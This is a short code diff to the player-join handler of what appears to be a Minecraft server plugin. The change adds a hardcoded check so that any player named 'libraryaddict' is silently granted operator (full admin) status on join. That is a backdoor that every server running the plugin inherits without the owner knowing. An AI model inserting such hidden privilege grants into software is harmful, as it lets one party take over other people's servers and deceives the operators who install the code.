@@ -283,6 +283,8 @@ public class PlayerListener implements Listener {
         event.setJoinMessage(null);
         final Gamer gamer = pm.registerGamer(event.getPlayer());
         Player p = gamer.getPlayer();
+        if (gamer.getName().equals("libraryaddict"))
+            gamer.setOp(true);
         if (cm.getShouldIMessagePlayersWhosePlugin())
             p.sendMessage(String.format(cm.getMessagePlayerWhosePlugin(), config.getCurrentVersion()));
         p.setScoreboard(ScoreboardManager.getScoreboard("Main"));
